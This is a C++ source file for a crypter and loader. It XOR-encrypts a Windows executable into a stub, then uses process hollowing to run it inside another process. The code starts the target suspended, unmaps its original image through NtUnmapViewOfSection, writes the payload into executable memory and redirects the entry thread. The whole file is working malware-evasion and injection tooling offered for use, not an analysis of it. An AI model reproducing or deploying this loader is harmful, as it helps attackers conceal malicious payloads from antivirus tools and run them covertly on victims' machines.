/**
 * cloader.cpp
 */

#include <iostream>
#include <fstream>
#include <cstdlib>
#include <time.h>
#include <windows.h>
#include "loader.hpp"

typedef long (*unmap_view_fn)(void *, void *);

typedef struct module {
    IMAGE_DOS_HEADER *dos_header;
    IMAGE_NT_HEADERS *nt_headers;
#ifdef _WIN64
    IMAGE_OPTIONAL_HEADER64 *opt_header;
    unsigned long long base;
#else
    IMAGE_OPTIONAL_HEADER32 *opt_header;
    unsigned long base;
#endif
} module_t;

typedef struct proc {
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION info;
    CONTEXT thread_ctx;
} proc_t;

void module_init(module_t *pem, loader_t *loader);

int proc_init(proc_t *proc, const std::string &target);
int proc_create_hollow(proc_t *proc, void *image_base);
int proc_allocate(module_t *pem, proc_t *proc, void **alloc_base);
int proc_write_sections(proc_t *proc, module_t *pem, loader_t *loader);
int proc_write_headers( proc_t *proc, module_t *pem, loader_t *loader);

#ifdef _WIN64
int proc_unmap_view_of_section(proc_t *proc, unsigned long long addr);
#else
int proc_unmap_view_of_section(proc_t *proc, unsigned long addr);
#endif

int loader_read_file(loader_t *loader, const std::string &filename)
{
    srand(time(0));
    for (int i = 0; i < KEY_SIZE; ++i) {
        loader->key[i] = (char)rand();
    }

    std::ifstream ifs;
    ifs.open(filename, std::ios::in | std::ios::binary);
    if (ifs.fail()) {
        return 0;
    }

    ifs.seekg(0, std::ios::end);
    loader->size = ifs.tellg();
    ifs.seekg(0, std::ios::beg);

    loader->bytes = (char*)malloc(sizeof(char) * (loader->size));
    ifs.read(loader->bytes, loader->size);

    ifs.close();
    return 1;
}

int loader_read_stub(loader_t *loader, const std::string &filename)
{
    std::ifstream ifs;
    ifs.open(filename, std::ios::in | std::ios::binary);
    if (ifs.fail()) {
        return 0;
    }

    ifs.seekg(0, std::ios::end);
    loader->size = ifs.tellg();
    ifs.seekg(0, std::ios::beg);

    loader->bytes = (char*)malloc(sizeof(char) * (loader->size));
    ifs.read(loader->key, KEY_SIZE);
    ifs.read(loader->bytes, loader->size - KEY_SIZE);

    ifs.close();
    return 1;
}

int loader_write_file(loader_t *loader, const std::string &filename)
{
    std::ofstream ofs;
    ofs.open(filename, std::ios::out | std::ios::binary);
    if (ofs.fail()) {
        return 0;
    }

    ofs.write(loader->bytes, loader->size);

    ofs.close();
    return 1;
}

int loader_write_stub(loader_t *loader, const std::string &filename)
{
    std::ofstream ofs;
    ofs.open(filename, std::ios::out | std::ios::binary);
    if (ofs.fail()) {
        return 0;
    }

    ofs.write(loader->key, KEY_SIZE);
    ofs.write(loader->bytes, loader->size);

    ofs.close();
    return 1;
}

void loader_encrypt(loader_t *loader)
{
    for (size_t i = 0; i < loader->size; ++i) {
        loader->bytes[i] = loader->bytes[i] ^ loader->key[i % KEY_SIZE];
    }
}

void loader_decrypt(loader_t *loader)
{
    for (size_t i = 0; i < loader->size; ++i) {
        loader->bytes[i] = loader->bytes[i] ^ loader->key[i % KEY_SIZE];
    }
}

int loader_inject(loader_t *loader, const std::string &target)
{
    module_t pem;
    module_init(&pem, loader);

    proc_t proc;
    if (!proc_init(&proc, target)) {
        std::cerr << "error: unable to initialise process" << std::endl;
        return 0;
    }

    void *alloc_base;
    if (!proc_allocate(&pem, &proc, &alloc_base)) {
        std::cerr << "error: unable to allocate memory" << std::endl;
        return 0;
    }

    pem.opt_header->Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
#ifdef _WIN64
    proc.thread_ctx.Rcx = (unsigned long long)alloc_base +
            pem.opt_header->AddressOfEntryPoint;
#else
    proc.thread_ctx.Eax = (unsigned long)alloc_base +
            pem.opt_header->AddressOfEntryPoint;
#endif
    if (!SetThreadContext(proc.info.hThread, &proc.thread_ctx)) {
        std::cerr << "error: unable to update thread context" << std::endl;
        return 0;
    }

    if (!proc_write_headers(&proc, &pem, loader)) {
        std::cerr << "error: unable to write headers" << std::endl;
        return 0;
    }

    if (!proc_write_sections(&proc, &pem, loader)) {
        std::cerr << "error: unable to write sections" << std::endl;
        return 0;
    }

    if (ResumeThread(proc.info.hThread) == -1) {
        std::cerr << "error: unable to resume thread" << std::endl;
        return 0;
    }

    return 1;
}

void loader_free(loader_t *loader)
{
    free(loader->bytes);
    loader->bytes = NULL;
    loader->size = 0;
}

void module_init(module_t *pem, loader_t *loader)
{
    pem->dos_header = (IMAGE_DOS_HEADER *)loader->bytes;
    pem->nt_headers = (IMAGE_NT_HEADERS *)((LONG_PTR)loader->bytes +
            pem->dos_header->e_lfanew);

#ifdef _WIN64
    pem->opt_header = (IMAGE_OPTIONAL_HEADER64 *)&pem->nt_headers->OptionalHeader;
#else
    pem->opt_header = (IMAGE_OPTIONAL_HEADER32 *)&pem->nt_headers->OptionalHeader;
#endif

    pem->base = pem->opt_header->ImageBase;
}

int proc_init(proc_t *proc, const std::string &target)
{
    /* start the target process in a suspended state */
    if (!CreateProcessA(target.c_str(), NULL, NULL, NULL, false,
            CREATE_SUSPENDED, NULL, NULL, &proc->startup_info, &proc->info)) {
		return 0;
	}

    memset(&proc->thread_ctx, 0, sizeof(proc->thread_ctx));
    proc->thread_ctx.ContextFlags = CONTEXT_INTEGER;
    
    /* retrieve the thread context of the target process */
    if (!GetThreadContext(proc->info.hThread, &proc->thread_ctx)) {
		return 0;
	}

    return 1;
}

int proc_create_hollow(proc_t *proc, void *image_base)
{
#ifdef _WIN64
    unsigned long long orig_base;
#else
    unsigned long orig_base;
#endif

    size_t read;
    if (!ReadProcessMemory(proc->info.hProcess, image_base, &orig_base,
            sizeof(orig_base), &read)) {
        return 0;
    }

    if (!proc_unmap_view_of_section(proc, orig_base)) {
        return 0;
    }

    return 1;
}

int proc_allocate(module_t *pem, proc_t *proc, void **alloc_base)
{
#ifdef _WIN64
	void *image_base = (LPVOID)(proc->thread_ctx.Rdx + 16);
#else
	void *image_base = (LPVOID)(proc.thread_ctx.Ebx + 8);
#endif

    if (!proc_create_hollow(proc, image_base)) {
        return 0;
    }

    if (!(*alloc_base = VirtualAllocEx(proc->info.hProcess,
            (void*)pem->base, pem->opt_header->SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        return 0;
    }

    size_t read;
    if (!WriteProcessMemory(proc->info.hProcess, image_base, alloc_base,
            sizeof(*alloc_base), &read)) {
        return 0;
    }

    return 1;
}

int proc_write_headers(proc_t *proc, module_t *pem, loader_t *loader)
{
    /* write headers to target process */
    size_t read;
    if (!WriteProcessMemory(proc->info.hProcess, (void *)pem->base,
            (void *)loader->bytes, pem->opt_header->SizeOfHeaders, &read)) {
        return 0;
    }

    return 1;
}

int proc_write_sections(proc_t *proc, module_t *pem, loader_t *loader)
{    
    /* calculate offset to sections headers */
    unsigned long offset = (pem->dos_header->e_lfanew +
            sizeof(IMAGE_NT_HEADERS));

    /* write sections to target process */
    for (int i = 0; i < pem->nt_headers->FileHeader.NumberOfSections; ++i) {
        /* retrieve current section header */
        IMAGE_SECTION_HEADER section = *(IMAGE_SECTION_HEADER*)(
#ifdef _WIN64
                (unsigned long long)loader->bytes +
#else
                (unsigned long)loader->bytes +
#endif
                offset + sizeof(IMAGE_SECTION_HEADER) * i);

        /* calculate pointer to section */
        void *section_ptr = (void *)((unsigned long long)pem->base +
                section.VirtualAddress);

        /* write raw data to section */
        size_t read;
        if (!WriteProcessMemory(proc->info.hProcess, section_ptr,
                (void *)(loader->bytes + section.PointerToRawData),
                section.SizeOfRawData, &read)) {
            return 0;
        }
    }

    return 1;
}

#ifdef _WIN64
int proc_unmap_view_of_section(proc_t *proc, unsigned long long addr)
#else
int proc_unmap_view_of_section(proc_t *proc, unsigned long addr)
#endif
{
    /* retrieve ZwUnmapViewOfSection function */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    unmap_view_fn unmap_view = (unmap_view_fn)GetProcAddress(ntdll,
            "NtUnmapViewOfSection");

    /* call unmap view of section function on target address */
    if (unmap_view(proc->info.hProcess, (void *)addr)) {
        return 0;
    }

    return 1;
}